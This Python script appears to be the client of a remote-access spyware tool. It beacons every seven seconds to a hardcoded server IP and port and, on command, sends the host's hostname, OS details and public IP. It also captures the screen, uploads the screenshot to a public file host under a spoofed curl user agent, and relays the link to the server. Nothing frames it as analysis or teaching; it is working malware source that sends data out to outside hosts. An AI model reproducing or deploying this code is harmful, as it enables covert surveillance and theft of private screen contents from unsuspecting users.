import platform
import socket
from requests import get
import requests
import time

ip = '54.79.26.131'  # Server IP
port = 4570  # Server port

# Function to send PC info to the server
def send_pcinfo():
    system_info = platform.uname()  # Get system info
    node_name = system_info.node  # Get device name (hostname)
    DeviceIP = get('https://api.ipify.org').text  # Get public IP address

    info = [
        ":PCINFO",  # Command to indicate it's PC info
        node_name,  # Device name
        f"System: {system_info.system}",
        f"Release: {system_info.release}",
        f"Version: {system_info.version}",
        f"Machine: {system_info.machine}",
        f"Processor: {system_info.processor}",
        f"IP: {DeviceIP}"
    ]

    # Connect to the server and send the PC info
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send("\n".join(info).encode())  # Send info in lines
    s.close()  # Close the connection

def send_screenshot():
    import pyautogui
    import tempfile

    # Take screenshot
    screenshot = pyautogui.screenshot()

    with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as tmp:
        temp_path = tmp.name
        screenshot.save(temp_path)

    file_path = temp_path

    headers = {
        'User-Agent': 'curl/7.68.0'
    }

    with open(file_path, 'rb') as f:
        files = {'file': f}
        response = requests.post('https://0x0.st', headers=headers, files=files)

    if response.status_code == 200:
        screenshot = ":SCREENSHOT\n" + response.text.strip()
    else:
        print("Upload failed:", response.text)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(screenshot.encode())  # Send screenshot in lines
    s.close()  # Close the connection

# Main function to constantly check the server for commands
def main():
    system_info = platform.uname()  # Get system info
    node_name = system_info.node  # Device name
    DeviceIP = get('https://api.ipify.org').text  # Public IP address

    while True:
        try:
            # Connect to the server to send ping and check for commands
            server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server.connect((ip, port))

            # Send ping message with device name and IP
            ping = f":CLIENTPING\n{node_name}\n{DeviceIP}"
            server.send(ping.encode())
            response = server.recv(4096).decode()

            # If the server sends a GETINFO command, send back PC info
            if response.startswith(":COMMAND :GETINFO"):
                send_pcinfo()
            
            elif response.startswith(":COMMAND :GETSCREENSHOT"):
                send_screenshot()

            # Handle other responses here if needed
            elif response.startswith("OTHER"):
                pass  # Add handling for other commands if needed

            server.close()  # Close the server connection
        except Exception as e:
            print(f"[!] Error: {e}")  # Print error if connection fails

        time.sleep(7)  # Wait before trying again

if __name__ == "__main__":
    main()  # Run the main function
